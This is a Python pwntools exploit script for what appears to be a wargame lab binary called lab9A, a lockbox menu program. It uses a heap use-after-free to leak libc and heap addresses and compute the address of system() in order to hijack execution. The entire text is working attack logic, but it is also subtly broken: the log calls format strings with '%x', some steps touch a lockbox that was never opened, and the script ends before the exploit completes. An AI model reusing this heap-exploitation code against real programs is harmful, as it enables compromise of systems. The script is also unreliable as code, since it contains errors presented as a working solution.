from pwn import *
import sys

BIN_PATH = "/levels/lab09/lab9A"
SYSTEM_OFFSET = 0x16a2bf


def open_lockbox(index, element):
    p.sendline('1')
    p.recvuntil('Which lockbox do you want?: ')
    p.sendline(str(index))
    p.recvuntil('How many items will you store?: ')
    p.sendline(str(element))
    p.recvuntil('Enter choice: ')


def add_item_to_lockbox(index, data):
    p.sendline('2')
    p.recvuntil('Which lockbox?: ')
    p.sendline(str(index))
    p.recvuntil('Item value: ')
    p.sendline(data)
    p.recvuntil('Enter choice: ')


def get_item_from_lockbox(index, element):
    p.sendline('3')
    p.recvuntil('Which lockbox?: ')
    p.sendline(str(index))
    p.recvuntil('Item value: ')
    p.sendline(str(element))
    p.recvuntil('= ', timeout=.5)
    output = p.recvline(timeout=.5).strip()
    p.recvuntil('Enter choice: ', timeout=.5)
    return output


def destroy_lockbox(index):
    p.sendline('4')
    p.recvuntil('Which set?: ')
    p.sendline(str(index))
    p.recvuntil('Enter choice: ')


p = process(BIN_PATH)
p.recvuntil('Enter choice: ')
open_lockbox(0, 256)
open_lockbox(1, 256)
destroy_lockbox(1)
destroy_lockbox(0)

open_lockbox(0, 128)

libc_addr = int(get_item_from_lockbox(0, 0)) & 0xffffffff
log.info("Stage #1 - Leaking libc address: 0x%x" % hex(libc_addr))

add_item_to_lockbox(3, 600)
heap_addr = int(get_item_from_lockbox(3, 389)) & 0xffffffff
log.info("Stage #2 - Leaking heap address: 0x%x" % hex(heap_addr))

destroy_lockbox(3)
system_addr = libc_addr + SYSTEM_OFFSET
log.info("Stage #3 - Calculating system() address: 0x%x" % hex(system_addr))
open_lockbox(0, str(system_addr))

